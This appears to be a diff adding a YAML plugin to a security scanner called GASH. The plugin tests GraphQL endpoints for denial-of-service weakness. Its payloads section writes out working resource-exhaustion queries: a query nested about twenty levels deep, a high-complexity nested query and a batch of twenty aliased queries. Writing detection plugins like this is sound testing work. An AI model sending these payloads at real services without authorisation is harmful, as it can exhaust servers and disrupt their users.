@@ -1,0 +1,44 @@
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright (C) 2026 Xmar1881 / GASH contributors
+# Module: github.com/Xmar1881/Gash
+#
+# File: plugins/graphql-dos/graphql-dos.yaml
+# What: Tier 1 GraphQL DoS via query depth/complexity via DifferentialOracle.
+# Why: Tests if deeply nested queries or high-complexity queries cause
+#   resource exhaustion (timeout, error, or significant delay). Uses
+#   differential oracle comparing deep query vs shallow query response
+#   time/divergence. Only runs with --active; harmless read-only queries.
+
+id: graphql-dos
+name: GraphQL DoS (Query Depth/Complexity)
+description: Detects GraphQL DoS vulnerability via deeply nested queries or high-complexity queries that cause resource exhaustion.
+author: GASH contributors
+severity: high
+tags: [graphql, dos, query-depth, complexity, denial-of-service]
+safe: false
+deep: false
+active: true
+requires_auth: false
+max_requests: 20
+phase: probe
+order: 93
+api_version: "1.0"
+tests: tests/fixtures/graphql-dos/
+request:
+  method: POST
+  headers:
+    Content-Type: application/json
+  paths: ["/graphql", "/api/graphql", "/v1/graphql"]
+  payloads:
+    # Deeply nested query (depth 20)
+    - '{"query":"query{user{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{posts{author{name}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}"}'
+    # High complexity query (many fields)
+    - '{"query":"query{users{id,name,email,posts{id,title,content,comments{id,text,author{id,name,email,posts{id,title,comments{id,text}}}}}}}}"}'
+    # Batch query abuse
+    - '{"query":"query{q1:users{id}q2:users{id}q3:users{id}q4:users{id}q5:users{id}q6:users{id}q7:users{id}q8:users{id}q9:users{id}q10:users{id}q11:users{id}q12:users{id}q13:users{id}q14:users{id}q15:users{id}q16:users{id}q17:users{id}q18:users{id}q19:users{id}q20:users{id}}"}'
+oracle:
+  name: differential
+  params:
+    repeats: 3
+    confidence_ceiling: "firm"
+    false_payload: '{"query":"query{users{id,email}}"}'
